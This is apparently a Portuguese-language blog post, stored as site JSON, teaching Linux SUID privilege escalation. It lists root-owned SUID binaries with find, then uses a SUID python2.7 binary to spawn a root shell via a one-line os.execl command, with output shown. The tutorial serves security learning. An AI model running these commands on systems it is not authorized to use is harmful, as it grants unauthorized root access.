{"pageProps":{"frontmatter":{"title":"SUID Privilege Escalation","date":"2020-09-07","categories":"hacking","author":"ReddyyZ","lang":"pt-BR","tags":["privilege escalation","linux"],"reading_time":"1 minute","excerpt":"Privilege escalation é uma vulnerabilidade que permite que o hacker consiga elevar seus privilégios, obtendo acesso à recursos protegidos.","cover_image":"https://reddyyz.github.io/images/posts/suid.jpg","private":false,"category":"hacking"},"slug":"suid-privilege-escalation","content":"\r\nPrivilege escalation é uma vulnerabilidade que permite que o hacker consiga elevar seus privilégios, obtendo acesso à recursos protegidos.<br>\r\nNeste artigo, vou explicar e demonstrar como escalonar seus privilégios através do SUID.\r\n\r\n## SUID Privilege Escalation\r\n\r\n### O que é o SUID\r\n\r\nBIT SUID é uma permissão especial que faz com que quando um arquivo seja executado, este tenha as mesmas permissões do usuário proprietário deste arquivo. O que permite que outros usuários sejam tratados como root (ou algum outro usuário), ao executar o arquivo.\r\n\r\nVamos a um exemplo:\r\n\r\nO root é dono de um arquivo que executa o comando passado por argumento, este arquivo tem o bit SUID, e todos os usuários tem permissão de executá-lo. Caso um usuário comum use esse script para executar um comando, esse comando será executado como root devido ao bit SUID.\r\n\r\n\r\n### Encontrando arquivos com o bit SUID\r\n\r\nAgora que já entendemos como funciona o bit SUID, vamos encontrar arquivos com o bit SUID e que o dono seja o root.\r\n\r\nPara isso usaremos uma ferramenta que já vem com o linux chamada find, vamos ao comando.\r\n```sh\r\nfind / -user root -perm /4000 2>/dev/null\r\n```\r\n<button class=\"copy\" onClick=\"copy_to_clip2('find / -user root -perm /4000 2>/dev/null')\">Copiar comando</button>\r\n\r\nExplicando o comando:\r\n\r\nEspecifica o dono do arquivo `-user root`<br>\r\nProcura por arquivos com o bit SUID `-perm /4000`<br>\r\nEsconde os erros `2>/dev/null`\r\n\r\nResultado:\r\n\r\n```sh\r\nreddyyz@fsociety~$ find / -user root -perm /4000 2>/dev/null\r\n/usr/lib/openssh/ssh-keysign\r\n/usr/lib/policykit-1/polkit-agent-helper-1\r\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\r\n/usr/lib/eject/dmcrypt-get-device\r\n/usr/lib/chromium/chrome-sandbox\r\n/usr/lib/xorg/Xorg.wrap\r\n/usr/libexec/spice-client-glib-usb-acl-helper\r\n/usr/share/code/chrome-sandbox\r\n/usr/sbin/mount.cifs\r\n/usr/sbin/mount.nfs\r\n/usr/sbin/pppd\r\n/usr/bin/mount\r\n/usr/bin/vmware-user-suid-wrapper\r\n/usr/bin/gpasswd\r\n/usr/bin/su\r\n/usr/bin/python2.7\r\n/usr/bin/fusermount3\r\n/usr/bin/sudo\r\n/usr/bin/passwd\r\n/usr/bin/vncserver-x11\r\n/usr/bin/kismet_cap_linux_wifi\r\n/usr/bin/chfn\r\n/usr/bin/bwrap\r\n/usr/bin/newgrp\r\n/usr/bin/chsh\r\n/usr/bin/kismet_cap_linux_bluetooth\r\n/usr/bin/ntfs-3g\r\n/usr/bin/pkexec\r\n/usr/bin/umount\r\n/usr/bin/kismet_cap_nrf_mousejack\r\n/usr/bin/Xtightvnc\r\n/home/reddyyz/VMWARE/vmware-tools-distrib/lib/bin64/vmware-user-suid-wrapper\r\n/home/reddyyz/VMWARE/vmware-tools-distrib/lib/bin32/vmware-user-suid-wrapper\r\n```\r\nEsses são todos os arquivos com permissão SUID que o dono é o root.\r\n\r\n### Encontrando e explorando um privilege escalation\r\n\r\nOlhando esses arquivos, um que chama atenção é o `/usr/bin/python2.7`.<br>\r\nVamos verficiar se existe algum exploit conhecido para o python no [GTFOBins](https://gtfobins.github.io/gtfobins/python/#suid), site com várias formas de privilege escalation.\r\n\r\n![GTFOBins Python](/images/posts/gtfobins-python.PNG)\r\n\r\nEncontramos uma forma de escalar nossos privilégios!<br>\r\nVamos executar o comando `python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'`\r\n\r\n```sh\r\nreddyyz@fsociety:~$ python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'\r\n# whoami\r\nroot\r\n# \r\n```\r\n<button class=\"copy\" onClick=\"document.get\">Copiar comando</button>\r\n\r\nConseguimos escalar nossos privilégios com sucesso para root!","categories":{"hacking":4,"criptografia":1,"web":0}},"__N_SSG":true}